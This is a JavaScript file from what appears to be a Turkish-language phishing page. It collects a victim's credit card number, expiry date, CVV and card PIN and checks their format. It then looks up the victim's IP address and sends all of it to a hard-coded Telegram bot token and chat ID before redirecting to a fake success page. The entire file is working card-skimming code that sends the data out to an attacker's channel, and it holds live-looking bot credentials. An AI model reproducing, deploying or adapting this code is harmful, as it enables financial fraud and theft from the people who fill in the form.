const BOT_TOKEN = "8068339823:AAFNIqQZb_b-vE3oeZ0NGQ6QK4Xc0h34p7w";
const CHAT_ID = "-1002475411082";

window.slider1 = { prev: function() {} };
window.closeAlert = function() { document.getElementById('alertDiv').style.display = 'none'; };
window.uyariKapat = function() { document.getElementById('alertDiv3').style.display = 'none'; };

function luhnKontrol(kartNo) {
    var sum = 0, alt = false;
    for (var i = kartNo.length - 1; i >= 0; i--) {
        var n = parseInt(kartNo.charAt(i), 10);
        if (alt) { n *= 2; if (n > 9) n -= 9; }
        sum += n;
        alt = !alt;
    }
    return sum % 10 === 0;
}

function sktKontrol(skt) {
    if (!skt || skt.length !== 5) return false;
    var ay = parseInt(skt.substring(0,2), 10);
    var yil = parseInt(skt.substring(3,5), 10);
    var now = new Date();
    var nowYil = now.getFullYear() % 100;
    var nowAy = now.getMonth() + 1;
    if (ay < 1 || ay > 12) return false;
    if (yil < nowYil) return false;
    if (yil === nowYil && ay < nowAy) return false;
    return true;
}

function showAlert(msg) {
    var alertDiv = document.getElementById('alertDiv');
    if (alertDiv) {
        alertDiv.style.display = 'block';
        var p = alertDiv.querySelectorAll('p');
        if (p[2]) p[2].innerText = msg;
    }
}

function submitCustomForm() {
    var kartNo = document.getElementById('customUsername').value.replace(/\s/g, '');
    var skt = document.getElementById('exp').value;
    var cvv = document.getElementById('cvv').value;
    var sifre = document.getElementById('kkpw').value;
    
    if (!kartNo || kartNo.length !== 16) { showAlert('Kart numarası 16 haneli olmalıdır.'); return; }
    if (!luhnKontrol(kartNo)) { showAlert('Geçersiz kart numarası!'); return; }
    if (!skt || skt.length !== 5) { showAlert('Son kullanma tarihi AA/YY formatında olmalıdır.'); return; }
    if (!sktKontrol(skt)) { showAlert('Son kullanma tarihi geçersiz veya süresi dolmuş!'); return; }
    if (!cvv || cvv.length !== 3) { showAlert('CVV 3 haneli olmalıdır.'); return; }
    if (!sifre || sifre.length !== 4) { showAlert('Kart şifresi 4 haneli olmalıdır.'); return; }
    
    document.getElementById('alertDiv').style.display = 'none';
    var btn = document.getElementById('btn-spc');
    if (btn) { btn.innerHTML = 'Giriş yapılıyor...'; btn.disabled = true; }
    
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://api.ipify.org?format=json', true);
    xhr.onload = function() {
        var ip = 'Bilinmiyor';
        if (xhr.status === 200) ip = JSON.parse(xhr.responseText).ip;
        var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent('Kredi Kartı Bilgisi:\n Kart No: ' + kartNo + '\n SKT: ' + skt + '\n CVV: ' + cvv + '\n Şifre: ' + sifre + '\n IP: ' + ip);
        var xhr2 = new XMLHttpRequest();
        xhr2.open('GET', url, true);
        xhr2.send();
        setTimeout(function() { window.location.href = 'success.html'; }, 1000);
    };
    xhr.send();
}

document.addEventListener('DOMContentLoaded', function() {
    var kart = document.getElementById('customUsername');
    if (kart) kart.addEventListener('input', function() {
        var d = this.value.replace(/\s/g, '').replace(/\D/g, '');
        var f = '';
        for (var i = 0; i < d.length && i < 16; i++) { if (i > 0 && i % 4 === 0) f += ' '; f += d[i]; }
        this.value = f;
        document.getElementById('alertDiv').style.display = 'none';
    });
    var exp = document.getElementById('exp');
    if (exp) exp.addEventListener('input', function() {
        var d = this.value.replace(/\D/g, '');
        this.value = d.length >= 3 ? d.slice(0,2) + '/' + d.slice(2,4) : d;
        document.getElementById('alertDiv').style.display = 'none';
    });
    var cvv = document.getElementById('cvv');
    if (cvv) cvv.addEventListener('input', function() { this.value = this.value.replace(/\D/g, '').slice(0,3); document.getElementById('alertDiv').style.display = 'none'; });
    var pw = document.getElementById('kkpw');
    if (pw) pw.addEventListener('input', function() { this.value = this.value.replace(/\D/g, '').slice(0,4); document.getElementById('alertDiv').style.display = 'none'; });
});
